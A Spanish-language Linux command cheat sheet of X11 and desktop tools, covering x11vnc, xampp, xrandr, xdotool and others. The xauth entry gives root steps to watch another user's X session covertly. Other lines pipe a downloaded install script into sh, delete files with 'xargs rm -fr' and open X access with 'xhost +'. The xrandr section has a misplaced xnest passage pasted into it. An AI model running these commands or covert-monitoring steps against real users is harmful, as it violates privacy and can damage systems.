	* Ctrl+H , Alt+H Cambiar el historial.
	* flecha abajo - Bajar una línea de la vista.
	* flecha arriba - Moverse hacia arriba en una línea de la vista.
	* Bajar página - Bajar una página de la vista.
	* Avanzar página - Mueve hacia arriba una página de la vista.


wuzzah
Programa que escanea selectivamente los registros utmpx de un sistema [donde se almacenan los inicios de sesión, entre otras cosas], vigilando a los que inician y cierran sesión y, realizando acciones personalizables en eventos.
$ wuzzah


wyrd
Aplicación de planificación personal para cálculos de fechas, fases lunares, amanecer/atardecer, calendario hebreo, alarmas, mensajes multilingües y manejo de vacaciones.
$ wyrd


x11vnc
Conexion remota. Comparte la misma ventana abierta. En el cliente: xvncviewer o xtightvnc
En el servidor:
$ x11vnc -storepasswd (Preguntará contraseña y donde guardarla; por defecto en /home/USER/.vnc/passwd)
$ vncpasswd  (otra forma de entrar la contraseña)
$ x11vnc -create  (Abrir nueva sesión)
$ x11vnc -rfbauth /home/USER/.vnc/passwd (Arrancar el server)
$ x11vnc -usepw -display :0  (lo mismo especificando la sesión X a visualizar)
En el cliente:
# xvncviewer IP_servidor
$ killall x11vnc (Matar el servidor)
Otra forma de arrancar el server  y que se ejecute en segundo plano (-bg), contraseña de acceso (-passwd) e interfaz gráfico (-gui):
$ x11vnc -bg -gui -passwd la_que_sea
Se abrirá una pantalla de configuración, en la que podremos configurar las opciones del servidor. Algunas de la pestaña Permissions:
	allow: Lista de IPs (separadas por comas) a las que se permite acceso.
	forever: Que el servidor no cierre al desconectar el cliente
	viewonly: No permitir cambios en el servidor.
1.-
Conexión inversa abriendo vnc desde ssh de forma remota:
$ vncviewer -listen   (en el Pc al cual nos conectaremos)
# x11vnc -connect IP_o_HOST:puerto -display :0 -auth guess
Desde terminal en las X:
$ vncviewer -listen   (en el pc del que nos conectaremos)
Entramos por ssh al remoto de la forma normal [ssh usuario@host] y una vez dentro, lanzamos:
$ x11vnc -connect IP_o_HOST:puerto
Donde la IP_o_HOST es la máquina donde hemos lanzado el vncviewer -listen
2.-
Otra forma de conexión inversa:
Abrir vinagre y en remota/conexiones inversas, clicar las dos casillas (Habilitar conexiones inversas y siempre habilitado) y luego abrir terminal y lanzar:
$ ssh usuario@host_remoto (Realizar la conexión ssh normal)
Y cuando se está en el host_remoto:
$ (DISPLAY=:0 x11vnc -connect host_actual:5500 &)
Nota: los paréntesis son porque al ejecutar una sub-shell interprete todos los comandos como un único comando.


xampp
Gestor de páginas web locales
Para instalar xampp es necesario desinstalar apache porque el paquete ya lo incluye.
Descargar la aplicación de: http://www.apachefriends.org/en/xampp-linux.html
# tar xvfz xampp-linux-1.6.5a.tar.gz -C /opt
# /opt/lampp/lampp start (Arrancar todas las aplicaciones xampp)
Comprobar en el navegador la correcta instalación (http://localhost) y mirar en el apartado seguridad los puntos vulnerables.
# /opt/lampp/lampp security (Para entrar las constraseñas)
La proxima vez que se entre en localhost pedirá el usuario (por defecto lampp) y la contraseña introducida anteriormente.
# /opt/lampp/lampp phpstatus (para saber la versión php)
# /opt/lampp/lampp php5 (activar php 5 o php4)
# /opt/lampp/lampp startssl (arrancar apache con soporte ssl. Para acceder: https://localhost)
Otras opciones:
start / stop / restart arrancar / parar / reiniciar xampp
startapache /stopapache arrancar / parar apache
startmysql / stopmysql arrancar / parar la base de datos mysql
startftp /stopftp arrancar / parar ftp server (user: nobody, password: lampp)
Directorios:
/opt/lampp/htdocs : Directorio donde guardar las páginas que esten online.
/opt/lampp/etc/httpd.conf : configuración de apache.
/opt/lampp/etc/my.cnf : configuración de mysql.
/opt/lampp/etc/php.ini : configuración de php.
/opt/lampp/etc/proftpd.conf : configuración de ftp.
/opt/lampp/etc/phpmyadmin/config.inc.php : configuración de
phpmyadmin
1.-
Activar el protocolo SSL en XAMPP, por defecto deshabilitado.
Copiar los archivos libeay32.dll y ssleay32.dll de la carpeta xampp\php\ en la carpeta xampp\apache\bin\ , sobreescribiendo los existentes.
Editar el fichero php.ini  que puede encontrarse en alguno de los siguienetes directorios:  xampp\apache\bin o xampp\php y descomentar la linea:
extension=php_openssl.dll
En caso de que no aparezca esa línea añadirla final del archivo


xapian
[xapian-tools]. Biblioteca de motor de búsqueda que permite a los desarrolladores integrar capacidades de búsqueda y recuperación de información en sus aplicaciones. Implementa el modelo probabilístico de recuperación de información y proporciona funciones para realizar búsquedas de texto libre clasificadas, retroalimentación de relevancia, búsqueda de frases, búsqueda booleana, derivación y actualización y búsqueda simultáneas. Incluye las herramientas copydatabase, quest, xapian-check, xapian-compact, xapian-delve, xapian-metadata, xapian-pos, xapian-progsrv, xapian-replicate, xapian-replicate-server y xapian-tcpsrv.
$ xapian-check /ruta/al/indice (verificar la integridad de un índice de xapian para asegurar de que no este corrupto)
$ xapian-compact /ruta/al/indice /ruta/al/nuevo_indice (herramienta se utiliza para compactar un índice si se han eliminado muchos documentos del índice)
$ xapian-delve /ruta/al/indice (herramienta permite explorar el contenido de un índice y ver la información sobre los documentos que contiene  para depurar y comprender cómo se han indexado los documentos)
$ xapian-metadata /ruta/al/indice (permite mostrar y modificar metadatos en un índicen como incluir información adicional sobre el índice, como su tamaño o estadísticas de uso)
Ejemplo:
# update-apt-xapian-index (crear una base de datos con apt-xapian-index)
# xapian-check /var/lib/apt-xapian-index/index (verifica que esté todo OK)
       docdata:
       blocksize=8K items=65693 firstunused=202 revision=7 levels=1 root=2
       B-tree checked okay
       docdata table structure checked OK
       #
       termlist:
       blocksize=8K items=131386 firstunused=3108 revision=7 levels=2 root=958
       B-tree checked okay
       termlist table structure checked OK
       ...
# xapian-delve /var/lib/apt-xapian-index/index
       UUID = 95ca8cb8-7513-4f89-80d9-631574ffaa4e
       number of documents = 65693
       average document length = 28.1853
       document length lower bound = 9
       document length upper bound = 997
       highest document id ever used = 65693
       has positional information = false
       revision = 7
       currently open for writing = false
# copydatabase /var/lib/apt-xapian-index/index ~/Docs/apt-xapian/
# ls ~/Docs/apt-xapian
       docdata.glass  flintlock  iamglass  postlist.glass  spelling.glass  synonym.glass  termlist.glass


xarclock
Reloj invertido [de iquierda a derecha]
$ xarclock -roman -chime -fg white -bg blue -hd red -hl yellow -update 1 -geometry 200x200 (Con los números romanos [roman] en blanco [fg], que marque con un "clin" las medias horas y con dos las horas [chime], fondo azul [bg], manecillas en rojo [hd], borde de las manecillas amarillas [hl], marcando los segundos [update] y geometria 200x200)


xargs
lee y ejecuta los comandos de la entrada estándar cogiendolos como parámetros. Si no se pasa ningún comando, por defecto se usa el comando “echo”. Algunos usos de este comando:
$ ls | xargs rm -fr (elimina todos los archivos del directorio. Se emplea cuando la cantidad de archivos a eliminar desborda el buffer si pretendemos eliminarlos con rm -fr *)
$ ls | xargs -t -i mv {} {}.bak (Renombra todos los archivos del presente directorio añadiéndoles .bak)
$ echo | xargs --show-limits (conocer el límite de argumentos que xargs admite)


xauth
Monitorización de sesiones X11 sin conocimiento del usuario apartir de los cookies que se guardan en el fichero .Xauthority del directorio del usuario que inició la sesión X (o en el indicado por la variable XAUTHORITY). Este fichero sólo tiene permiso de acceso para el usuario y para root. Para visualizar los cookies:
$ xauth list
Pasos para controlar la sesión:
1 Conectar como root al sistema que queremos controlar
2 Averiguar el display en el que está conectado el usuario y poner nuestra variable DISPLAY a ese valor (export DISPLAY=:0). Normalmente será el :0, sí no ver en el directorio /tmp/.X11-unix los displays activos
3 Poner la variable XAUTHORITY igual al nombre del fichero .Xauthority del usuario:
# export XAUTHORITY=/home/usuario/.Xauthority
4. Verificación. Con:
# xauth list
deberíamos ver las cookies del usuario.


xawtv
Ver y grabar canales de televisión y cámaras web. Consta de las siguientes aplicaciones: mtt [visor de teletexto], ntsc-cc, rootv, subtitles, v4lctl y xawtv-remote [Control remoto].
$ xawtv (abrir la ventana y comenzar a mostrar el video del dispositivo de captura de TV configurado, si existe alguno)
$ xawtv -hwscan (lista de dispositivos reconocidos)
$ xawtv -c /dev/video0 (especificar el dispositivo a usar)
$ xawtv -c /dev/video0 -channel 5 (abrir el dispositivo especificado y sintonizar el canal 5)
$ xawtv -grab (capturar un fotograma)
$ xawtv -f (pasar a pantalla completa
$ xawtv -record archivo (grabar la salida de video a un archivo)
$ xawtv -config ~/.xawtv (archivo de configuración)
$ xawtv -channels channels.conf (cargar los canales desde el archivo)


xbacklight
Ajustar el brillo de la pantalla
$ xbacklight -set 100  (la pone al máximo)


xbindkeys
Gestión de atajos de teclado. Archivo de configuración en .xbindkeysrc.
$ xbindkeys -d (Muestra cuales)
$ xbindkeys -k  (dará nombre de la tecla pulsada)
$ xbindkeys -km (Para consultar varias teclas)
Modo de entrar un atajo:
"gnome-terminal"
   Mod4 + t
Abrirá la terminal pulsando las teclas “Win” + “t”


xboxdrv
Comando para arrancar el driver de los mandos (gamepad) para Xbox y Xbox360 (y compatibles). Requiere hacer blacklist del módulo xpad. Se puede hacer sin afectar al sistema haciendo lo siguiente:
# rmmod xpad
También se puede hacer permanente el cambio añadiendo el driver al final del fichero /etc/modprobe.d/blacklist.conf con la línea siguiente: blacklist xpad
# xboxdrv --silent (arrancar en modo silencioso)
# xboxdrv --device-by-id 1234:1234 --type xbox360 (Arranca el driver para un gamepad con un ID específico. Puedes ver la ID ejecutando lsusb)


xclip
Copia al portapapeles la salida de cualquier comando.
$ who | xclip
$ xclip -selection clipboard -o (mostrar el contenido del portapapeles)
$ xclip -o (Lo pegará en la terminal [pst-tty] donde lo lancemos)
$ xclip -i /etc/fstab (copiará el fstab)
$ xclip -o -d :0 wicd(Para pegarlo en las tty)
$ echo "linux es genial" | xclip -selection clipboard (copiar un texto en el portapepeles)
$ xclip -o fichero (Lo pega en fichero)
$ who | xclip -sel clip  (Lo pega en cualquier aplicación de las X)
$ xclip archivo (Enviar el contenido de un archivo al portapapeles)
$ xclip -selection clipboard /dev/null (borrar contenido del portapapeles)


xclock
Reloj para las X.
$ xclock (analogico)
$ xclock -d (digital)


xcwd
Herramienta que abre una terminal de la ventana enfocada. Cambia el directorio de trabajo para la conexión a la ruta solicitada. Si, por ejemplo, tenemos thunar con la dirección /var/www/html/tractatus, y abrimos una terminal y tecleamos:
$ urxvt -cd "$(xcwd)"
Se abrirá otra terminal con la ruta indicada por thunar.


xd
Programa [eXtra fast Directory changer] que se utiliza para cambiar rápidamente entre directorios siempre que se incluya el argumento --input, sinó, solo los muestra.
$ xd /ulb (la "/" indica que partimos del directorio raiz. En el ejemplo podría ser /usr/local/bin)
$ xd .Dl (el "." que partimos del directorio de inicio del usuario. En el ejemplo podría ser ~/Documentos/libros)
$ cd 0le (el "0" indica que partimos del directorio en el que estemos. En el ejemplo, si estamos en ~/Documentos, podría tratarse de libros/emacs)
$ xd --input /ulb (entra en el directorio /usr/local/bin)
Si existen varios con las mismas iniciales mostraría la lista para escoger el número del que corresponda al que queremos.


xdg-mime
Consultar e instalar tipos MIME y asociaciones.
$ xdg-mime default brave-browser.desktop x-scheme-handler/http (establecer brave como navegador predeterminado)
$ xdg-mime default atril.desktop application/pdf (establecer atril como lector de pdfs predeterminado)
$ xdg-mime query default text/html (Mostrar la aplicación que por defecto abre un html)
$ xdg-mime query default application/pdf (consultar cual es el lector de pdfs determinado)
$ xdg-mime query default inode/directory (consultar la terminal predeterminada)
$ xdg-mime default thunar.desktop inode/directory (establecer el navegador de archivos)
$ xdg-mime query default video/ogg (consultar el lector de videos)
$ xdg-mime default mpv.desktop video/x-flv video/ogg video/webm video/mpeg video/mp4 video/flv video/avi (establecer como lector de videos predeterminado mpv para todas las extensiones referenciadas)
$ xdg-mime query default image/jpeg image/png image/webp (consultar el letor de imágenes)
$ xdg-mime query filetype documento.pdf (consultar el tipo MIME de un archivo)


xdg-settings
[xdg-utils]. Obtener o establecer el navegador web y los manejadores URI predeterminados.
$ xdg-settings get default-web-browser (ver el navegador por defecto)
$ xdg-settings set default-web-browser firefox.desktop (cambiar a firefox)
$ xdg-settings check default-web-browser firefox.desktop (chequear si firefox es el navegador por defecto)


xdg-utils
Utilidades que permiten a las aplicaciones interactuar con el entorno de escritorio [Desktop Environment, DE] de forma independiente del DE específico que se esté usando [GNOME, KDE, LXDE, XFCE, MATE, etc.]. Esto es crucial para que las aplicaciones instaladas desde fuentes externas como AppImages, snaps, o paquetes .deb, funcionen correctamente en cualquier entorno gráfico. Incluye las siguientes herramientas xdg-desktop-menu, xdg-desktop-icon, xdg-email, xdg-icon-resource, xdg-mime [ver], xdg-open, xdg-screensaver y xdg-settings [ver]. Los archivos .desktop están en /usr/share/applications/ o ~/.local/share/applications/, los íconos se instalan en ~/.local/share/icons/ o /usr/share/icons/.
$ xdg-open https://www.google.com (abre un archivo, URL o directorio con la aplicación predeterminada)
$ xdg-open /home/usuario/documentos/foto.jpg
$ xdg-open /home/usuario/Documentos/
$ xdg-email --subject "Hola" --body "Este es un mensaje de prueba" usuario@ejemplo.com (abre el cliente de correo electrónico predeterminado)
$ xdg-icon-resource install --novendor --size 64 miapp.png miapp (instalar un ícono para una app personalizada, no añade un prefijo de proveedor, tamaño, archivo de la imagen y nombre icono sin extensión)
$ xdg-icon-resource uninstall miapp (desinstalarlo)
$ xdg-desktop-menu install --novendor miapp.desktop (instalar una entrada de menú)
$ xdg-desktop-menu uninstall miapp.desktop (desinstalarla)
$ xdg-desktop-menu forceupdate (forzar actualización del menú si no aparece inmediatamente)
$ xdg-desktop-icon install --novendor miapp.desktop (crear un acceso directo en el escritorio)
$ xdg-desktop-icon uninstall miapp.desktop (eliminarlo)
$ xdg-screensaver suspend (informar al sistema que estás activo para evitar que se apague la pantalla)
$ xdg-screensaver resume (restaurar el comportamiento normal)
$ xdg-screensaver status (comprobar el estado)
$ ls /usr/bin/xdg-* (ver todos los comandos disponibles)
El archivo miapp.desktop debe estar bien formado. Ejemplo mínimo:
$ nano miapp.desktop
        [Desktop Entry]
        Name=Mi Aplicación
        Exec=/usr/bin/miapp
        Icon=miapp
        Type=Application
        Categories=Utility;


xdotool
Herramienta que permite simular la entrada del teclado y la actividad del ratón, mover, redimensionar ventanas, etc.
$ xdotool -h  (Listado de opciones)
$ xdotool key alt+F2 (Simula la pulsación de alt + F2 y arranca la aplicación asociada a la combinación)
$ xdotool mousemove 0 0 (Envia el puntero a la coordenada especificada, en este caso, extremo superior izquierdo)
$ xdotool getmouselocation (Indica las coordenadas del puntero)
$ xdotool click 1 (Hace “click” donde esté el puntero)
Ejemplo en un script [que abra una nueva pestaña, escriba “ifconfig” y pulse “return”]:
	#!/bin/bash
	xdotool key shift+ctrl+t;
	xdotool type "ifconfig";
	xdotool key Return;


xdpyinfo
Muestra información de las DPI disponibles de la sesión de Xorg actual.


xephyr
Contenedor para lanzar aplicaciones X en paralelo al servidor X en ejecución.
$ Xephyr :1 -screen 1024x768 (Lanzar la aplicación)
	:1 (valor para la variable DISPLAY a la hora de querer mostrar la aplicación dentro de Xephyr)
	-screen (resolución que tendrá la nueva pantalla)
$ DISPLAY=:1 startxfce4 (Arrancar una sesión xfce4 dentro de Xephyr)


xev
Conocer el código asociado a la tecla.
$ xev (una vez lanzada la aplicación, pulsar la tecla de la que se quiera conocer el código asociado)
	...
	keycode 134 (keysym 0xffec, Super_R)
	...


xfburn
Grabador de cds i dvds.
$ xfburn -a (grabar cd de audio)
$ xfburn -d (De datos)


xfce4
Escritorio ligero. Para la confección de los atajos de teclado, tener en cuenta lo que lanzan algunas de las aplicaciones:
$ xfce4-accesibility-settings (Configurar ratón y teclado)
$ xfce4-appearance-settings (Estilo de ventana, iconos tipo de letra..)
$ xfce4-appfinder (Buscar aplicaciones)
$ xfce4-display-settings (resolución de pantalla)
$ xfce4-keyboard-settings (Atajos de teclado, comportamiento...)
$ xfce4-mouse-theme (opciones del puntero)
$ xfce4-notes (Notas rápidas)
$ xfce4-popup-applicationsmenu (Menu general)
$ xfce4-screenshooter (Captura de pantalla)
$ xfce4-session-logout (Menú salir, reiniciar...)
$ xfce4-settings-manager (Parámetros de escritorio)
$ xfce4-terminal (Terminal)
1.-
Instalar applet de brillo de pantalla (backligth):
# apt-get install xfce4-power-manager-plugins
Despues agregar el applet al panel
2.-
Restaurar / Reparar escritorio XFCE
$ rm -Rv ~/.cache/sessions/
$ xfwm4
Si continua fallando lanzar:
$ xfwm4 --replace
3.-
Los atajos se especifican con la aplicación gráfica "xfce4-keyboard-settings" pero el archivo principal de atajos de teclado del usuario está en
~/.config/xfce4/xfconf/xfce-perchannel-xml/xfce4-keyboard-shortcuts.xml
El general en:
/etc/xdg/xfce4/xfconf/xfce-perchannel-xml/xfce4-keyboard-shortcuts.xml


xfe
Gestor de archivos ligero. Puede mostrar hasta tres paneles, con o sin árbol de directorios. Tambien incluye papelera de reciclaje, compresor/descompresor, editor de textos (Xfw), visualizador de textos (Xfv), visor de imágenes (Xfi) y gestor de paquetes (Xfp).


xflock4 (xfce4-utils)
Activa el protector de pantalla. Solicitará contraseña para salir.


xfm
Gestor de archivos minimalista.


xfonts-utils
Conjunto de programas que son necesarios para la administración de fuentes.
bdftopcf [convierte fuentes BDF en fuentes PCF], bdftruncate y ucs2any [herramientas para generar fuentes con varias codificaciones a partir de fuentes codificadas ISO 10646], fonttosfnt [para empaquetar fuentes de mapa de bits en un contenedor sfnt (TrueType)], mkfontdir [programa para generar archivos fonts.dir], mkfontscale [programa para generar archivos fonts.scale], update-fonts-alias, update-fonts-dir y update-fonts-scale


xfpt
Crear un xml a partir de un texto plano.
$ xfpt -o archivo.txt


xfrun4
Lanzador de aplicaciones propio de xfce.


xgamma
Cambiar el brillo de la pantalla.
$ xgamma -gamma 2.0
$ xgamma -gamma 1.0 (Vuelve a la situación anterior)
$ xgamma -rgamma 2.0 (aumentar rojos)
$ xgamma -bgamma 2.2 (aumentar azules)
$ xgamma -ggamma 2.2 (aumentar los verdes)


xh
Herramienta para enviar solicitudes HTTP. Descargar:
# curl -sfL https://raw.githubusercontent.com/ducaale/xh/master/install.sh | sh
$ xh http://localhost/emacs
$ xh example.com (no es necesario colocar http://)
$ xhs example.com (no es necesario colocar https://)
$ xh -d url -o archivo (descargar y guardar en un archivo)


xhost
Se utiliza para agregar o eliminar usuarios o nombres de host a la lista permitida para hacer conexiones a al servidor X.
$ xhost
$ xhost + (permitir que cualquier usuario se conecte al servidor X)
$ xhost + 32.125.3.12 (Permiter el acceso al servidor X a una ip)
$ xhost - 32.125.3.12 (Anular el permiso)


xidle
Ejecuta un programa específico después de un cierto tiempo de inactividad o cuando el cursor del mouse se mueve a un borde de la pantalla durante un tiempo determinado.
$ xidle -delay 10 -sw -area 10 -program /usr/bin/lxlock -timeout 200 (Ejecutar lxlock si no se detecta actividad en 200 segundos o si el puntero permanece en una area de 10 pixels de la esquina de abajo a la izquierda durante más de 10 segundos)


xininfo
Utilidad para consultar el diseño y tamaño actual del monitor o monitores configurados.
$ xininfo -print (información del monitor)


xinit
Permite iniciar un servidor X. El script startx [ver] es un front-end para xinit. De forma predeterminada, xinit y startx inician un servidor X en la pantalla :0. Si no existe el archivo .xinitrc del usuario, xinit/startx lanza un servidor X en pantalla y después un emulador de terminal Xterm en ella. Cuando el Xterm finaliza, xinit/startx cierra el servidor X y, generalmente, inicia un script que a su vez ejecuta un número de programas dado y un gestor de ventanas.


xinput
Muestra las id de los dispositivos de entrada.
$ xinput


xjokes
Cuatro pequeños programas divertidos para modificar una pantalla X11: yasiti, blackhole, mori1 y mori2. En todos los casos la visualización se restaurará posteriormente.
$ blackhole (produce un efecto de alejamiento animado en una pantalla)
$ mori1 -display :0 (muestra una pantalla llena con caras de una niña guiñándote un ojo en la pantalla especificada)
$ mori2 (muestra la cara grande de una chica que te guiña un ojo)
$ yasiti (muestra un pequeño objeto negro giratorio en el centro de la pantalla)
Nota.-  Por defecto se utiliza la visualización especificada por la variable de entorno DISPLAY [echo $DISPLAY].


xkcd-dl
Herramienta en python (Instalación: sudo pip install xkcd-dl) para descargar las historietas geeks de la página xkcd.com.
$ xkcd-dl --update-db (actualizar la base de datos)
$ xkcd-dl --download=1605 (Descargar una en concreto)
$ xkcd-dl --download-all (Descargar la colección completa)


xkcdpass
Generador de contraseñas relacionadas con frases [en inglés].
$ xkcdpass -C alternating --count=5 -a 'shit' -d '&' --min=6 --max=8 --valid-chars='[a-z,A-Z]' (5 palabras alternando mayúsculas y minúsculas, que la primera letra de cada palabra deletreen "shit", separadas con & y entre 6 y 8 letras)


xkeycaps
Muestra un teclado en X y pasando el puntero del ratón sobre las teclas muestra como se llaman y características.
$ xkeycaps -help (muestra todos los teclados soportados)
$ xkeycaps -kbd PC105ES (abre el teclado en versión española directamente)


xkill
Matar aplicaciones rebeldes.
$ xkill (El cursor se convierte en una calavera y donde se clica mata la aplicación)


xli
Visor de imágenes.
$ xli imagen.jpg
Teclas de control:
	l (Rotar 1/4 a la izquierda)
	r (Rotar 1/4 a la derecha)
	. (Actualizar la imagen)
	números del 5 al 2 (Aclarar la imagen)
	números del 6 al 9 (Oscurecer la imagen)
	< (Empequeñecer)
	> (Agrandar)
	q (salir)


xlock
[xclockmore]. Activar el protector de pantalla. Solicitará contraseña para salir.
$ xlock -mode anemona
Existen muchas opciones de “mode”: atlantis, dragon, crystal...)


xlsclients
Lista las aplicaciones que se están ejecutando en una sesión.
# xlsclients -display :0   (Especificando sesión)
# xlsclients -a      (Lo mismo de la sesión actual)
# xlsclients -l  (Lista extendida)


xmem
Monitoriza el uso de ram y de swap.
$ xmem -update 1 -codecolor black -nolabel (Que actualice resultados cada segundo, mostraqr en negro la memoria usada y sin mostrar el hostname)
Colores por defecto:
	-codecolor red (Color de la memoria usada)
	-cachecolor yellow (De la memoria caché)
	-buffercolor blue (Memoria del buffer)
	-freecolor green (de la memoria libre)
	-swapcolor red (de la memoria swap. Mismo color que la memoria usada)


xmltoman
Script para convertir archivos .xml a páginas man en formato groff o html. Presenta los elementos habituales de la página de manual, como "description", "options", "see also", etc.
xmltoman archivo.xml > archivo.html


xmllint
[libxml]. Hace más legible el lenguaje XML. También incluye la aplicacion ament_xmllint que solo indica si el archivo está bien formado.
$ ament_xmllint archivo.xml
$ xmllint archivo.xml
$ xmllint --html archivo.xml (con salida como html)


xmlstarlet
Utilidad que permite manipular, filtrar, editar, buscar, validar y aplicar hojas de estilo al contenido XML. Desafortunadamente es extremadamente poco intuitivo y muchos usuarios luchan con los parámetros de línea de comando ofuscados y el lenguaje peculiar de scripting. Aquí mostraremos algunas formas en que puede usarse para simplificar algunas tareas básicas diarias.
$ xmlstarlet sel -t -v "count(//linux)" texto.xml (cuantas veces aparece la palabra "linux" en "texto.xml"
$ xmlstarlet sel -t -m "//linux" -v "species" -o " " -v "@name" -n texto.xml
$ xmlstarlet sel --net -t -m "//linux" -o "Title: " -v "title" -n -o "Author: " -v "author" -n  http://URL (de un sitio web)
$ xmlstarlet sel --net --html -t -m "//linux" -v "@src" -n http://URL
Algunas de las opciones:
	sel (que planeamos extraer o filtrar datos)
	-t (que los siguientes parámetros forman parte de la plantilla de salida)
	-v (utiliza para generar el valor de una expresión xpath)
	-m (que repita en todos los nodos que coincidan con la expresión xpath proporcionada [linux])
	-o (que genere una cadena de texto y se usa en este ejemplo para incluir un espacio entre los dos valores asociados con cada "linux".)
	-n (que incluya nueva línea. Si se omite todos los datos aparecerían en una línea de texto.)
	--net (que descargue el contenido XML desde una ubicación remota.)
	--html (extraer datos de un sitio web.)


xmlwf
[expat]. Determina si un documento XML está bien formado.
$ xmlwf -c ejemplo.xml -d ~/salida/ (intentará validar el archivo XML y mostrará un mensaje de éxito si está bien formado o un error si no lo está y lo copiará en el direcotorio ~/Salida)
$ xmlwf -k ejemplo.xml ejemplo2.xml ejemplo3.xml (de forma predeterminada después del primer archivo con un error se para, la opción -k indica que informe el error pero que siga procesando)
$ wmlwf -t ejemplo.xml (que analice el archivo completo, pero que no realice ningún procesamiento)
Estado de salida:
       0 --> Los archivos de entrada están bien formados y la salida, si se solicitó, se escribió correctamente.
       1 --< Se produjo un error interno.
       2 --> Uno o más archivos de entrada no estaban bien formados o no se pudieron analizar.
       3 --> Si se usa la opción -d, se produjo un error al abrir un archivo de salida.
       4 --> Hubo un error de argumento de línea de comandos en la forma en que se invocó xmlwf.


xmodmap
Muestra la disposición del teclado
$ xmodmap -pke (listado)
$ xmodmap -e 'keycode 66 = Shift_L' (acoplar una tecla a determinada asignación [que la tecla "Bloq Mayús" funcione como la "shift" debajo de ella.])
Nota.- el keycode [código de la tecla] se averigua lanzando xev [ver]


xnest
Herramienta que permite abrir un servidor X dentro de otro servidor X
$ Xnest :20 -ca & (Sesion número 20)
Para mandar instancias al servidor xnest:
$ xterm -display :20 (Abrirá exterm en el interior de la sesión 20)
$ Xnest :20 -geometry 800x600 & (Especificando medidas de la ventana)


xpenguins
Pingüinos caminando por la parte superior de la ventana.
$ xpenguins -l (lista de temas)
$ xpenguins -t Bill -n 10 -p -m 5 (10 pinguinos con el tema Bill, ignorando las ventanas emergentes y un retraso de 5 fotogramas entre ellos)


xphoon
Muestra las fases de la luna como fondo de pantalla. Para que se visualice ha de matarse el fondo de pantalla activo.
$ xphoon -demo (Muestra una demo rápida de todas las fases de la luna)
$ xphoon -t 10 -i (Que actualice la imagen cada 10 minutos y muestre el identificador del proceso [PID])


xpra
Permite ejecutar en un equipo una aplicación remota desde un servidor X, manteniendo la conexión aunque esta se hay interrumpido. Posibilita la comunicación remota con aplicaciones individuales sin que sea obligatorio cargar todo el escritorio remoto.
	@client:~$ ssh usuario@servidor.com (Establecer conexión con el servidor)
	@server:~$ xpra start :5 (Arrancar el Display 5)
	@server:~$ DISPLAY=:5 midori & (Lanzar una aplicación [midori] en el display 5)
	@server:~$ logout (Cerrar la conexión con el servidor)
	Realizar una nueva conexión con el servidor esta vez con xpra y contra el display 5:
	@client:~$ xpra attach ssh:usuario@servidor.com:5 (Después de entrar la contraseña, se abrirá la aplicación midori del servidor en el cliente)
	@server:~$ xpra list (Lista las sesiones xpra abiertas)
	@server:~$ xpra stop :5 (Cierra el display 5)
	@server:~$ xpra attach :5 (Entra en el display 5)


xprintidle
Utilidad que consulta al servidor X el tiempo de inactividad del usuario y lo imprime en la salida estándar en milisegundos.
$ xprintidle


xprobe
Intenta identificar sistemas operativos remotos enviando una serie de tests y determinando su tipo en base a las respuestas recibidas.
# xprobe2 ip
varios ejemplos de uso en su pagina man


xprop
Propiedades de una ventana. Si no se especifica ID de dicha ventana, el cursor se convierte en una cruz y mostrará la que se clique.
$ xprop -display :0 -spy | grep "WM_NAME(STRING)"  (Sobre el navegador, mostrará las páginas visitadas)


xrandr
Cambiar la resolución de pantalla.
$ xrandr  (muestra la resolución usada, la máxima, la mínima y todas las posibles. La marcada con un "*" es la usada y la “+” es la optima)
$ xrandr | grep \* | cut -d' ' -f4 (otra forma de ver la resolución usada)
$ xrandr -s 1280x1024    (modificar la resolución)
$ xrandr -r 76   (modificar la tasa de refresco)
$ xrandr --auto (configurar proyectores externos)
$ xrandr -q | awk -F'current' -F',' 'NR==1 {gsub("( |current)","");print $2}'  (solo muestra la resolución usada)
$ xrandr -q | grep -w Screen (muestra la mínima, la usada y la máxima)
Ejemplo práctico:
Conocer resoluciones y cual es la utilizada:
$ xrandr
crear/agregar nueva resolución:
$ cvt 1127 999 | grep Modeline | cut -d" " -f 2-
"1128x999_60.00"   93.00  1128 1200 1312 1496  999 1002 1012 1037 -hsync +vsync
cargar la nueva resolución:
$ xrandr --newmode "1128x999_60.00"   93.00  1128 1200 1312 1496  999 1002 1012 1037 -hsync +vsync
Comprobar que se ha agregado la nueva resolución:
$ xrandr
añadir el modo creado a la tarjeta conectada (VGA-0, LVDS1...)
$ xrandr --addmode VGA-0 1128x999_60.00
Para eliminar este modo: xnest
Herramienta que permite abrir un servidor X dentro de otro servidor X
$ xnest :20 -ca & (Sesion número 20)
Para mandar instancias al servidor xnest:
$ xterm -display :20 (Abrirá exterm en el interior de la sesión 20)
$ xnest :20 -geometry 800x600 & (Especificando medidas de la ventana)
$ xrandr --rmmode VGA-0 1128x999_60.00
Para predeterminar la nueva configuración:
$ xrandr --output VGA-0 --mode 1128x999_60.00
Si nos da un error “out of range” (fuera de rango) suele ser porque la tasa de refresco del monitor es diferente de la configurada por defecto. Para modificarla:
$ xrandr --output VGA-0 --mode 1128x999_60.00 --rate 60,3
Una vez comprobado que todo funciona para hacer permanentes los cambios:
# nano /etc/gdm/Init/Default
A continuación de las lineas:
	PATH=”/usr/bin:$PATH”
	OLD_IFS=$IFS
Añadir:
	xrandr --newmode "1128x999_60.00"   93.00  1128 1200 1312 1496  999 1002 1012 1037 -hsync +vsync
	xrandr --addmode VGA-0 1128x999_60.00
	xrandr --output VGA-0 --mode 1128x999_60.00 --rate 60,3
Reiniciar.


xrdb
Permite administrar la base de datos de recursos X. La base de datos de recursos X, comúnmente conocida como Xresources, es utilizada por el sistema X Window para almacenar las preferencias del usuario y los ajustes de configuración para aplicaciones X, esto proporciona una manera de cambiar dinámicamente la apariencia o el comportamiento de las aplicaciones sin reiniciarlas. Xrdb no carga ningún archivo por sí solo, pero muchos entornos de escritorio usan xrdb para cargar archivos ~/.Xresources al inicio de la sesión para inicializar la base de datos de recursos, como un reemplazo generalizado de los archivos ~/.Xdefaults.
$ xrdb .Xresources (recargar la configuración de .Xresources)
$ xrdb -query (Consulta la base de datos de recursos e imprime los valores establecidos)
$ xrdb -load ~/.Xresources (recargar los nuevos valores si se ha modificado el archivo)


xrefresh
Refresca la imagen del servidor Xorg


xrestop
Monitoriza los recuros X11 de los clientes conectados. Ayuda a encontrar problemas con el consumo de las aplicaciones que corren en las X. Se considera un derivado de top.
$ xrestop


xrootconsole
Mostrar un archivo en la pantalla del escritorio.
$ xrootconsole archivo
$ xrootconsole -bg black -fg red (especificando color de fondo y letra)
Otras opciones:
	-geometry 70x20 (Por defecto 80x10+0+0)
